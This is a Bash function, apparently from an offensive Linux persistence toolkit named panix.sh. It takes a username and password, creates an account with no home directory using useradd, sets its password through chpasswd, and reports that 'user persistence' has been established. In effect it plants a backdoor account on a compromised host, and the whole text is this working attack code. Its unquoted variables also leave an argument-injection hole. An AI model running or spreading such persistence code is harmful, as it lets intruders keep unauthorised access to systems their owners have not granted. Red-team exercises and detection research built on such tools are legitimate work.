setup_create_new_user() {
	local username=""
	local password=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_create_user() {
		echo "Usage: ./panix.sh --create-user [OPTIONS]"
		echo "--examples                 Display command examples"
		echo "--username <username>      Specify the username"
		echo "--password <password>      Specify the password"
        echo "--help|-h                  Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--username )
				shift
				username=$1
				;;
			--password )
				shift
				password=$1
				;;
			--examples )
				echo "Examples:"
				echo "sudo ./panix.sh --create-user --username <username> --password <password>"
				exit 0
				;;
			--help|-h)
				usage_create_user
				exit 0
				;;
			* )
				echo "Invalid option for --create-user: $1"
				echo "Try './panix.sh --create-user --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $username || -z $password ]]; then
		echo "Error: --username and --password must be specified."
		echo "Try './panix.sh --create-user --help' for more information."
		exit 1
	fi

	useradd -M $username
	echo "$username:$password" | chpasswd

	echo "[+] User persistence through the new $username user established!"
}
